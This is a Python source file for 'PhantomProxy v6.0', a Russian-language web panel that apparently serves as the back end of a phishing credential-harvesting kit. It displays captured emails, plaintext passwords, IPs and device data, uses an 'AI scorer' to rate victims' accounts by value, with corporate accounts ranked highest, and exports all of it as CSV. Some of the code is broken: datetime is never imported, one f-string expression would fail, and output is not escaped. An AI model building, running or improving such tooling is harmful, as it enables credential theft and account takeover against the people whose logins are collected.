#!/usr/bin/env python3
"""
PhantomProxy v6.0 - AI-Powered Ultimate Panel
С AI классификацией, оценкой качества и предсказаниями
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sqlite3, os, sys
from urllib.parse import urlparse, parse_qs

# Добавляем путь к ai_scorer
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ai_scorer import AIScorer

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'phantom.db')

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

class AIPoweredPanelHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == '/' or path == '/index.html':
            self.show_ai_dashboard()
        elif path == '/sessions':
            self.show_ai_sessions()
        elif path == '/quality':
            self.show_quality_analysis()
        elif path == '/export':
            self.export_csv()
        elif path == '/api/ai/stats':
            self.api_ai_stats()
        elif path == '/api/ai/sessions':
            self.api_ai_sessions()
        else:
            self.send_response(404)
            self.end_headers()
    
    def show_ai_dashboard(self):
        scorer = AIScorer()
        stats = scorer.get_statistics()
        
        total = stats.get('total', 0)
        avg_score = stats.get('average_score', 0)
        classifications = stats.get('classifications', {})
        excellent = classifications.get('EXCELLENT', 0)
        good = classifications.get('GOOD', 0)
        
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        today = c.fetchone()[0]
        conn.close()
        
        html = f'''<!DOCTYPE html>
<html lang="ru">
<head>
    <title>PhantomProxy v6.0 - AI Dashboard</title>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="30">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); 
            color: #eee; 
            min-height: 100vh;
        }}
        .header {{ 
            background: rgba(0, 0, 0, 0.3); 
            padding: 25px 40px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            backdrop-filter: blur(10px);
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }}
        .logo {{ 
            font-size: 28px; 
            font-weight: bold;
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        .nav {{ display: flex; gap: 10px; }}
        .nav a {{ 
            background: rgba(255,255,255,0.1); 
            color: white; 
            padding: 12px 25px; 
            border-radius: 30px; 
            text-decoration: none; 
            transition: all 0.3s;
            border: 1px solid transparent;
        }}
        .nav a:hover {{ 
            background: rgba(0, 210, 255, 0.2);
            border-color: #00d2ff;
            transform: translateY(-2px);
        }}
        .container {{ padding: 50px; max-width: 1800px; margin: 0 auto; }}
        .stats {{ 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
            gap: 30px; 
            margin-bottom: 50px; 
        }}
        .stat-card {{ 
            background: rgba(255,255,255,0.05); 
            padding: 40px; 
            border-radius: 20px; 
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }}
        .stat-card::before {{
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
            transform: rotate(45deg);
            animation: shine 3s infinite;
        }}
        @keyframes shine {{
            0% {{ transform: translateX(-100%) rotate(45deg); }}
            100% {{ transform: translateX(100%) rotate(45deg); }}
        }}
        .stat-card:hover {{ 
            transform: translateY(-10px);
            border-color: #00d2ff;
            box-shadow: 0 20px 40px rgba(0, 210, 255, 0.2);
        }}
        .stat-value {{ 
            font-size: 64px; 
            font-weight: bold; 
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            position: relative;
            z-index: 1;
        }}
        .stat-label {{ 
            color: #aaa; 
            margin-top: 15px; 
            font-size: 16px;
            position: relative;
            z-index: 1;
        }}
        .section {{ 
            background: rgba(255,255,255,0.05); 
            padding: 40px; 
            border-radius: 20px; 
            margin-bottom: 40px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }}
        .section h2 {{ 
            margin-bottom: 30px; 
            color: #00d2ff; 
            font-size: 28px;
            display: flex;
            align-items: center;
            gap: 15px;
        }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 18px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
        th {{ 
            background: rgba(0, 210, 255, 0.1); 
            color: #00d2ff; 
            font-weight: 600;
            text-transform: uppercase;
            font-size: 13px;
            letter-spacing: 1px;
        }}
        tr:hover {{ background: rgba(0, 210, 255, 0.05); }}
        .quality-badge {{ 
            padding: 8px 16px; 
            border-radius: 20px; 
            font-size: 12px; 
            font-weight: bold;
            display: inline-block;
        }}
        .quality-excellent {{ background: linear-gradient(45deg, #00b09b, #96c93d); }}
        .quality-good {{ background: linear-gradient(45deg, #00d2ff, #3a7bd5); }}
        .quality-average {{ background: linear-gradient(45deg, #f7971e, #ffd200); }}
        .quality-low {{ background: linear-gradient(45deg, #cb2d3e, #ef473a); }}
        .btn {{ 
            background: linear-gradient(45deg, #00d2ff, #3a7bd5); 
            color: white; 
            padding: 15px 30px; 
            border: none; 
            border-radius: 30px; 
            cursor: pointer; 
            text-decoration: none; 
            display: inline-block; 
            margin: 10px 5px; 
            transition: all 0.3s;
            font-size: 15px;
            font-weight: 600;
        }}
        .btn:hover {{ 
            transform: translateY(-3px); 
            box-shadow: 0 10px 30px rgba(0, 210, 255, 0.4);
        }}
        .ai-badge {{
            background: linear-gradient(45deg, #ff0099, #493240);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 11px;
            margin-left: 10px;
        }}
        .footer {{ text-align: center; padding: 40px; color: #666; font-size: 14px; }}
        .score-bar {{
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            overflow: hidden;
            margin-top: 10px;
        }}
        .score-fill {{
            height: 100%;
            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
            border-radius: 4px;
            transition: width 0.5s;
        }}
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🤖 PhantomProxy v6.0 <span class="ai-badge">AI-POWERED</span></div>
        <div class="nav">
            <a href="/">Dashboard</a>
            <a href="/sessions">Сессии</a>
            <a href="/quality">AI Анализ</a>
            <a href="/export">Экспорт</a>
        </div>
    </div>
    
    <div class="container">
        <h1 style="margin-bottom: 40px; font-size: 36px; color: #fff;">📊 AI Dashboard</h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">{total}</div>
                <div class="stat-label">Всего сессий</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{today}</div>
                <div class="stat-label">За 24 часа</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{avg_score}</div>
                <div class="stat-label">Среднее качество</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{excellent}</div>
                <div class="stat-label">Отличные сессии</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🎯 AI Классификация <span class="ai-badge">AI</span></h2>
            <table>
                <tr><th>Качество</th><th>Количество</th><th>Процент</th><th>Описание</th></tr>
                <tr>
                    <td><span class="quality-badge quality-excellent">EXCELLENT</span></td>
                    <td>{excellent}</td>
                    <td>{round(excellent/max(1,total)*100, 1)}%</td>
                    <td>Высококачественные корпоративные аккаунты</td>
                </tr>
                <tr>
                    <td><span class="quality-badge quality-good">GOOD</span></td>
                    <td>{good}</td>
                    <td>{round(good/max(1,total)*100, 1)}%</td>
                    <td>Хорошие аккаунты с полными данными</td>
                </tr>
                <tr>
                    <td><span class="quality-badge quality-average">AVERAGE</span></td>
                    <td>{classifications.get('AVERAGE', 0)}</td>
                    <td>{round(classifications.get('AVERAGE', 0)/max(1,total)*100, 1)}%</td>
                    <td>Средние аккаунты</td>
                </tr>
                <tr>
                    <td><span class="quality-badge quality-low">LOW</span></td>
                    <td>{classifications.get('LOW', 0)}</td>
                    <td>{round(classifications.get('LOW', 0)/max(1,total)*100, 1)}%</td>
                    <td>Низкокачественные или подозрительные</td>
                </tr>
            </table>
        </div>
        
        <div class="section">
            <h2>🏢 По сервисам</h2>
            <table>
                <tr><th>Сервис</th><th>Сессии</th><th>Процент</th></tr>
                {"".join(f"<tr><td>{k}</td><td>{v}</td><td>{round(v/max(1,total)*100, 1)}%</td></tr>" for k, v in stats.get('services', {{}}).items())}
            </table>
        </div>
    </div>
    
    <div class="footer">
        PhantomProxy v6.0 AI-Powered | Auto-refresh: 30s | AI Scoring Active | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_ai_sessions(self):
        scorer = AIScorer()
        sessions = scorer.analyze_all_sessions()
        
        html = '''<!DOCTYPE html>
<html lang="ru">
<head>
    <title>AI Сессии - PhantomProxy v6.0</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); color: #eee; }
        .header { background: rgba(0,0,0,0.3); padding: 25px 40px; backdrop-filter: blur(10px); }
        .logo { font-size: 24px; font-weight: bold; color: #00d2ff; }
        .container { padding: 40px; max-width: 2000px; margin: 0 auto; }
        .nav { margin: 20px 0; }
        .nav a { background: rgba(255,255,255,0.1); color: white; padding: 12px 25px; border-radius: 30px; text-decoration: none; margin-right: 10px; display: inline-block; }
        .nav a:hover { background: rgba(0, 210, 255, 0.2); }
        table { width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.05); border-radius: 20px; overflow: hidden; }
        th, td { padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
        th { background: rgba(0, 210, 255, 0.1); color: #00d2ff; }
        tr:hover { background: rgba(0, 210, 255, 0.05); }
        .quality-badge { padding: 6px 14px; border-radius: 20px; font-size: 11px; font-weight: bold; display: inline-block; }
        .quality-excellent { background: linear-gradient(45deg, #00b09b, #96c93d); }
        .quality-good { background: linear-gradient(45deg, #00d2ff, #3a7bd5); }
        .quality-average { background: linear-gradient(45deg, #f7971e, #ffd200); }
        .quality-low { background: linear-gradient(45deg, #cb2d3e, #ef473a); }
        .search { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 20px; margin-bottom: 20px; }
        .search input { width: 100%; padding: 15px; background: rgba(255,255,255,0.05); border: 1px solid rgba(0, 210, 255, 0.3); border-radius: 30px; color: white; font-size: 16px; }
        .score-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; }
        .score-fill { height: 100%; background: linear-gradient(90deg, #00d2ff, #3a7bd5); border-radius: 3px; }
    </style>
</head>
<body>
    <div class="header"><div class="logo">🤖 PhantomProxy v6.0 - AI Сессии</div></div>
    <div class="container">
        <div class="nav">
            <a href="/">← Dashboard</a>
            <a href="/quality">AI Анализ</a>
            <a href="/export">Экспорт</a>
        </div>
        <div class="search">
            <input type="text" id="searchInput" placeholder="🔍 AI Поиск по всем полям..." onkeyup="searchTable()">
        </div>
        <table id="sessionsTable">
            <tr><th>ID</th><th>Quality</th><th>Score</th><th>Email</th><th>Password</th><th>Service</th><th>IP</th><th>Screen</th><th>Created</th></tr>
'''
        for s in sessions:
            quality_class = s['classification'].lower()
            html += f"<tr><td>{s['id']}</td><td><span class='quality-badge quality-{quality_class}'>{s['classification']}</span></td><td><div class='score-bar'><div class='score-fill' style='width: {s['quality_score']}%'></div></div>{s['quality_score']}</td><td>{s['email']}</td><td>{s['password']}</td><td>{s['service']}</td><td>{s['ip']}</td><td>{s['screen_resolution']}</td><td>{s['created_at']}</td></tr>"
        
        html += '''</table>
    </div>
    <script>
        function searchTable() {
            const input = document.getElementById('searchInput');
            const filter = input.value.toUpperCase();
            const table = document.getElementById('sessionsTable');
            const tr = table.getElementsByTagName('tr');
            for (let i = 1; i < tr.length; i++) {
                let found = false;
                const td = tr[i].getElementsByTagName('td');
                for (let j = 0; j < td.length; j++) {
                    if (td[j] && td[j].textContent.toUpperCase().indexOf(filter) > -1) {
                        found = true;
                        break;
                    }
                }
                tr[i].style.display = found ? '' : 'none';
            }
        }
    </script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_quality_analysis(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>AI Quality Analysis - Coming Soon</h1>')
    
    def export_csv(self):
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC')
        rows = c.fetchall()
        conn.close()
        
        csv = "ID,Email,Password,Service,IP,User Agent,Screen,Timezone,Created\n"
        for row in rows:
            csv += f"{row['id']},{row['email']},{row['password']},{row['service']},{row['ip']},\"{row['user_agent']}\",{row['screen_resolution']},{row['timezone']},{row['created_at']}\n"
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/csv')
        self.send_header('Content-Disposition', 'attachment; filename="phantom_ai_data.csv"')
        self.end_headers()
        self.wfile.write(csv.encode())
    
    def api_ai_stats(self):
        scorer = AIScorer()
        stats = scorer.get_statistics()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(stats, default=str).encode())
    
    def api_ai_sessions(self):
        scorer = AIScorer()
        sessions = scorer.analyze_all_sessions()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(sessions, default=str).encode())
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 3000), AIPoweredPanelHandler)
    print('🤖 AI-Powered Panel запущена на порту 3000')
    print('📊 AI Dashboard: http://localhost:3000')
    print('🎯 AI Scoring: Active')
    server.serve_forever()
